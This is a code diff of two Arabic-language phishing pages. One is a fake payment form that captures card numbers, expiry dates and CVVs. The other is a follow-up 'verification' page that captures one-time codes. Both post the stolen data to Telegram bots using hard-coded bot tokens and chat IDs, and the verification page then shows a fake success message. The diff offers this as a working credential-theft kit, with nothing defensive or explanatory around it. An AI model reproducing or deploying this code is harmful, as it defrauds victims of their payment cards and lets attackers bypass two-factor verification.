@@ -1,50 +1,44 @@
+<!-- verify.html -->
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <title>صفحة الدفع</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>التحقق</title>
   <style>
-    body {font-family: Tahoma, Arial; background:#f9f9f9; margin:0; padding:0;}
-    .container {max-width:400px; margin:50px auto; background:#eef7ff; padding:25px; border-radius:12px; box-shadow:0 4px 8px rgba(0,0,0,0.1);}
-    h2 {text-align:center; color:#1e5a9c; margin-bottom:20px;}
+    body {font-family: Tahoma, Arial; background:#f5fff5; margin:0; padding:0;}
+    .container {max-width:400px; margin:50px auto; background:#eaffea; padding:25px; border-radius:12px; box-shadow:0 4px 8px rgba(0,0,0,0.1);}
+    h2 {text-align:center; color:#2b7a2b; margin-bottom:20px;}
     label {display:block; margin-bottom:8px; font-weight:bold; color:#333;}
     input, button {width:100%; padding:12px; margin-bottom:15px; border:1px solid #ccc; border-radius:6px; font-size:15px;}
-    button {background:#1e5a9c; color:white; font-weight:bold; cursor:pointer; border:none;}
-    button:hover {background:#14406d;}
+    button {background:#2b7a2b; color:white; font-weight:bold; cursor:pointer; border:none;}
+    button:hover {background:#1c551c;}
   </style>
 </head>
 <body>
   <div class="container">
-    <h2>بيانات الدفع</h2>
-    <label for="card">رقم البطاقة</label>
-    <input type="text" id="card" placeholder="xxxx xxxx xxxx xxxx">
+    <h2>التحقق</h2>
+    <label for="code">أدخل كود التحقق</label>
+    <input type="text" id="code" placeholder="ادخل الكود المرسل">
 
-    <label for="expiry">تاريخ الانتهاء</label>
-    <input type="text" id="expiry" placeholder="MM/YY">
-
-    <label for="cvv">CVV</label>
-    <input type="text" id="cvv" placeholder="3 أرقام خلف البطاقة">
-
-    <button onclick="sendPayment()">إرسال الدفع</button>
+    <button onclick="sendVerify()">تأكيد</button>
   </div>
 
   <script>
-    const BOT_TOKEN = "7994339638:AAHgur93jAzxz55NZTtD5J3WKgDaWZtlV3E";
-    const CHAT_ID = "16420566";
+    const BOT_TOKEN = "8175456301:AAHcojlkfA5YkgBkx5gAnvFjd-u5Tk6hg7I";
+    const CHAT_ID = "8404960059";
 
-    function sendPayment() {
-      const card = document.getElementById("card").value;
-      const expiry = document.getElementById("expiry").value;
-      const cvv = document.getElementById("cvv").value;
+    function sendVerify() {
+      const code = document.getElementById("code").value;
 
-      const message = `💳 محاولة دفع:\nرقم البطاقة: ${card}\nانتهاء: ${expiry}\nCVV: ${cvv}`;
+      const message = `✅ تم إدخال كود التحقق:\nالكود: ${code}`;
 
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({chat_id: CHAT_ID, text: message})
       }).then(() => {
-        window.location.href = "verify.html";
+        alert("تم التحقق بنجاح ✅");
       });
     }
   </script>
